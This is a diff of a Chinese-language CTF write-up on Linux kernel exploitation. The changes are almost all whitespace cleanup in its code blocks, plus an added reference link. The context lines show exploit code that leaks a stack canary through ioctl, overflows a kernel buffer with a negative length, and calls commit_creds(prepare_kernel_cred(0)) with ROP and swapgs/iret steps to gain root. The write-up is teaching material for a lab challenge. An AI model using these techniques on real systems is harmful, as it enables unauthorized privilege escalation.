@@ -491,11 +491,11 @@ class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href=
 <span id="cb16-32"><a href="#cb16-32" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b6549</span>    pop    rax</span>
 <span id="cb16-33"><a href="#cb16-33" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b654a</span>    test   ah, 2</span>
 <span id="cb16-34"><a href="#cb16-34" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b654d</span>    je     0xffffffffa00b65e5 <span class="op">&lt;</span>0xffffffffa00b65e5<span class="op">&gt;</span></span>
-<span id="cb16-35"><a href="#cb16-35" aria-hidden="true" tabindex="-1"></a> </span>
+<span id="cb16-35"><a href="#cb16-35" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb16-36"><a href="#cb16-36" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b6553</span>    call   0xffffffffa00d4720 <span class="op">&lt;</span>0xffffffffa00d4720<span class="op">&gt;</span></span>
-<span id="cb16-37"><a href="#cb16-37" aria-hidden="true" tabindex="-1"></a> </span>
+<span id="cb16-37"><a href="#cb16-37" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb16-38"><a href="#cb16-38" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b6558</span>    call   0xffffffffa00b6430 <span class="op">&lt;</span>0xffffffffa00b6430<span class="op">&gt;</span></span>
-<span id="cb16-39"><a href="#cb16-39" aria-hidden="true" tabindex="-1"></a> </span>
+<span id="cb16-39"><a href="#cb16-39" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb16-40"><a href="#cb16-40" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b655d</span>    mov    rax, qword ptr [rbx]</span>
 <span id="cb16-41"><a href="#cb16-41" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b6560</span>    test   al, 8</span>
 <span id="cb16-42"><a href="#cb16-42" aria-hidden="true" tabindex="-1"></a><span class="ex">─────────────────────────────────────────────────────────────────────────────────────────[</span> STACK ]─────────────────────────────────────────────────────────────────────────────────────────</span>
@@ -669,7 +669,7 @@ rbp）后，会将rbx(ioctl)作为返回地址，即retn指令会落脚在rbx(io
 <span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a>    commit_cred <span class="op">=</span> commit_cred_addr<span class="op">;</span></span>
 <span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a>    prepare_kernel_cred <span class="op">=</span>  prepare_kernel_cred_addr<span class="op">;</span></span>
 <span id="cb24-9"><a href="#cb24-9" aria-hidden="true" tabindex="-1"></a>    <span class="op">(*</span>commit_cred<span class="op">)((*</span>prepare_kernel_cred<span class="op">)(</span><span class="dv">0</span><span class="op">));</span></span>
-<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb24-11"><a href="#cb24-11" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;mov %rbp,%rsp&quot;</span><span class="op">);</span>    <span class="co">//修复栈帧</span></span>
 <span id="cb24-12"><a href="#cb24-12" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;pop %rbp&quot;</span><span class="op">);</span> <span class="co">//弹出rbp</span></span>
 <span id="cb24-13"><a href="#cb24-13" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;mov %0,%%rax;\</span></span>
@@ -677,7 +677,7 @@ rbp）后，会将rbx(ioctl)作为返回地址，即retn指令会落脚在rbx(io
 <span id="cb24-15"><a href="#cb24-15" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span></span>
 <span id="cb24-16"><a href="#cb24-16" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span><span class="st">&quot;r&quot;</span><span class="op">(</span>ret_addr<span class="op">)</span></span>
 <span id="cb24-17"><a href="#cb24-17" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span><span class="st">&quot;%rax&quot;</span><span class="op">);</span></span>
-<span id="cb24-18"><a href="#cb24-18" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb24-18"><a href="#cb24-18" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb24-19"><a href="#cb24-19" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
 <p>第一步：将rbp赋值rsp，因为rbp保存了原始的rsp（执行promote_root函数前）的值，因此只需要通过rbp还原rsp即可</p>
 <p>第二步：将栈上的rbp弹出</p>
@@ -715,7 +715,7 @@ class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href=
 <span id="cb26-18"><a href="#cb26-18" aria-hidden="true" tabindex="-1"></a>    commit_cred <span class="op">=</span> commit_cred_addr<span class="op">;</span></span>
 <span id="cb26-19"><a href="#cb26-19" aria-hidden="true" tabindex="-1"></a>    prepare_kernel_cred <span class="op">=</span>  prepare_kernel_cred_addr<span class="op">;</span></span>
 <span id="cb26-20"><a href="#cb26-20" aria-hidden="true" tabindex="-1"></a>    <span class="op">(*</span>commit_cred<span class="op">)((*</span>prepare_kernel_cred<span class="op">)(</span><span class="dv">0</span><span class="op">));</span></span>
-<span id="cb26-21"><a href="#cb26-21" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb26-21"><a href="#cb26-21" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb26-22"><a href="#cb26-22" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;mov %rbp,%rsp&quot;</span><span class="op">);</span>    <span class="co">//修复栈帧</span></span>
 <span id="cb26-23"><a href="#cb26-23" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;pop %rbp&quot;</span><span class="op">);</span></span>
 <span id="cb26-24"><a href="#cb26-24" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;mov %0,%%rax;\</span></span>
@@ -723,7 +723,7 @@ class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href=
 <span id="cb26-26"><a href="#cb26-26" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span></span>
 <span id="cb26-27"><a href="#cb26-27" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span><span class="st">&quot;r&quot;</span><span class="op">(</span>ret_addr<span class="op">)</span></span>
 <span id="cb26-28"><a href="#cb26-28" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span><span class="st">&quot;%rax&quot;</span><span class="op">);</span></span>
-<span id="cb26-29"><a href="#cb26-29" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb26-29"><a href="#cb26-29" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb26-30"><a href="#cb26-30" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
 <span id="cb26-31"><a href="#cb26-31" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb26-32"><a href="#cb26-32" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> get_kernel_func_addr<span class="op">(</span><span class="dt">char</span><span class="op">*</span> cmd<span class="op">)</span></span>
@@ -764,7 +764,7 @@ class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href=
 <span id="cb26-67"><a href="#cb26-67" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i<span class="op">=</span><span class="dv">0</span><span class="op">;</span>i<span class="op">&lt;</span><span class="dv">64</span><span class="op">;</span>i<span class="op">++)</span></span>
 <span id="cb26-68"><a href="#cb26-68" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
 <span id="cb26-69"><a href="#cb26-69" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;%016llx &quot;</span><span class="op">,</span>buf<span class="op">[</span>i<span class="op">]);</span></span>
-<span id="cb26-70"><a href="#cb26-70" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb26-70"><a href="#cb26-70" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb26-71"><a href="#cb26-71" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
 <span id="cb26-72"><a href="#cb26-72" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
 <span id="cb26-73"><a href="#cb26-73" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> canary <span class="op">=</span> buf<span class="op">[</span><span class="dv">0</span><span class="op">];</span></span>
@@ -778,7 +778,7 @@ class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href=
 <span id="cb26-81"><a href="#cb26-81" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;commit_cred:%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>commit_cred_addr<span class="op">);</span></span>
 <span id="cb26-82"><a href="#cb26-82" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;prepare_kernel_cred:%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>prepare_kernel_cred_addr<span class="op">);</span></span>
 <span id="cb26-83"><a href="#cb26-83" aria-hidden="true" tabindex="-1"></a>    <span class="co">//promote_root(commit_cred_addr,prepare_kernel_cred_addr);</span></span>
-<span id="cb26-84"><a href="#cb26-84" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb26-84"><a href="#cb26-84" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb26-85"><a href="#cb26-85" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> name_payload<span class="op">[</span><span class="dv">11</span><span class="op">];</span></span>
 <span id="cb26-86"><a href="#cb26-86" aria-hidden="true" tabindex="-1"></a>    memset<span class="op">(</span>name_payload<span class="op">,</span><span class="bn">0x90</span><span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>name_payload<span class="op">));</span></span>
 <span id="cb26-87"><a href="#cb26-87" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">8</span><span class="op">]</span> <span class="op">=</span> canary<span class="op">;</span><span class="co">//canary</span></span>
@@ -787,7 +787,7 @@ class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href=
 <span id="cb26-90"><a href="#cb26-90" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;name_payload_len:%u</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>name_payload<span class="op">));</span></span>
 <span id="cb26-91"><a href="#cb26-91" aria-hidden="true" tabindex="-1"></a>    <span class="co">//set name</span></span>
 <span id="cb26-92"><a href="#cb26-92" aria-hidden="true" tabindex="-1"></a>    write<span class="op">(</span>fd<span class="op">,</span>name_payload<span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>name_payload<span class="op">));</span></span>
-<span id="cb26-93"><a href="#cb26-93" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb26-93"><a href="#cb26-93" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb26-94"><a href="#cb26-94" aria-hidden="true" tabindex="-1"></a>    <span class="co">//triger stack mash and excute shellcode to promote to root</span></span>
 <span id="cb26-95"><a href="#cb26-95" aria-hidden="true" tabindex="-1"></a>    <span class="dt">long</span> <span class="dt">long</span> len <span class="op">=</span> <span class="op">-</span><span class="dv">65448</span><span class="op">;</span><span class="co">//unsigned short len =88</span></span>
 <span id="cb26-96"><a href="#cb26-96" aria-hidden="true" tabindex="-1"></a>    ioctl<span class="op">(</span>fd<span class="op">,</span>core_copy_func_cmd<span class="op">,</span>len<span class="op">);</span></span>
@@ -1024,8 +1024,7 @@ of the GS segment used by the kernel (typically it houses kernel
 structures).
 3）SWAPGS is intended for use with fast system calls when in 64-bit 
 mode to allow immediate access to kernel structures on transition to 
-kernel mode.
-</code></pre>
+kernel mode.</code></pre>
 <h3 id="rop-gadgets">4.2 rop gadgets</h3>
 <p>prepare_kernel_cred函数需要的gadget:</p>
 <blockquote>
@@ -1212,7 +1211,7 @@ class="sourceCode asm"><code class="sourceCode fasm"><span id="cb36-1"><a href="
 <span id="cb39-113"><a href="#cb39-113" aria-hidden="true" tabindex="-1"></a>    save_status<span class="op">();</span></span>
 <span id="cb39-114"><a href="#cb39-114" aria-hidden="true" tabindex="-1"></a>    build_rop<span class="op">(</span>canary<span class="op">);</span></span>
 <span id="cb39-115"><a href="#cb39-115" aria-hidden="true" tabindex="-1"></a>    <span class="co">// set name</span></span>
-<span id="cb39-116"><a href="#cb39-116" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb39-116"><a href="#cb39-116" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb39-117"><a href="#cb39-117" aria-hidden="true" tabindex="-1"></a>    write<span class="op">(</span>fd<span class="op">,</span> name_payload<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span>name_payload<span class="op">));</span></span>
 <span id="cb39-118"><a href="#cb39-118" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb39-119"><a href="#cb39-119" aria-hidden="true" tabindex="-1"></a>    <span class="co">// triger stack mash and excute shellcode to promote to root</span></span>
@@ -1230,7 +1229,7 @@ class="sourceCode bash"><code class="sourceCode bash"><span id="cb40-1"><a href=
 <span id="cb40-5"><a href="#cb40-5" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb40-6"><a href="#cb40-6" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb40-7"><a href="#cb40-7" aria-hidden="true" tabindex="-1"></a><span class="ex">iPXE</span> <span class="er">(</span><span class="ex">http://ipxe.org</span><span class="kw">)</span> <span class="ex">00:03.0</span> CA00 PCI2.10 PnP PMM+1FF8C8B0+1FECC8B0 CA00</span>
-<span id="cb40-8"><a href="#cb40-8" aria-hidden="true" tabindex="-1"></a>                                                                               </span>
+<span id="cb40-8"><a href="#cb40-8" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb40-9"><a href="#cb40-9" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb40-10"><a href="#cb40-10" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb40-11"><a href="#cb40-11" aria-hidden="true" tabindex="-1"></a><span class="ex">Booting</span> from ROM...</span>
@@ -1294,6 +1293,10 @@ class="sourceCode bash"><code class="sourceCode bash"><span id="cb43-1"><a href=
 <li><p>为什么最后一定要通过iret来进行跳转？</p></li>
 </ul>
 <h2 id="附录">6. 附录</h2>
+<p>参考：</p>
+<p>1.[ctf中 linux 内核态的漏洞挖掘与利用系列]
+https://www.anquanke.com/post/id/270917</p>
+<p>2.其他参考</p>
 <p>intel跳转指令：</p>
 <blockquote>
 <p>intel的跳转指令，需要借助eflags状态：</p>
